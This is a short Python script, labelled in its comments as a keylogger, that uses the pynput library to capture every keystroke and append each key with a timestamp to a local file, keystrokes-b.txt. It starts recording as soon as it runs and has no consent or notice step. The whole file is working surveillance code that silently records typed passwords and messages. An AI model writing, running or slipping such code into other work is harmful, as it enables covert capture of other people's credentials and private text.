from pynput import keyboard
import datetime


#SET DEFAULT VALUE FOR RECORDING
recording = True


#SETTINGS FOR KEYLOGGER
def on_press(key):
    #Start listening
    with open("keystrokes-b.txt", "a") as f:
        f.write(str(key) + '    ' + str(datetime.datetime.now()) + '\n')

def on_release(key):
    # Stop listening
    if recording == False:
        return False

#KEY RECORDER
def start_recording():
    if recording == True:
        #RECORDING KEYS
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

#Call function to start recording
start_recording()     
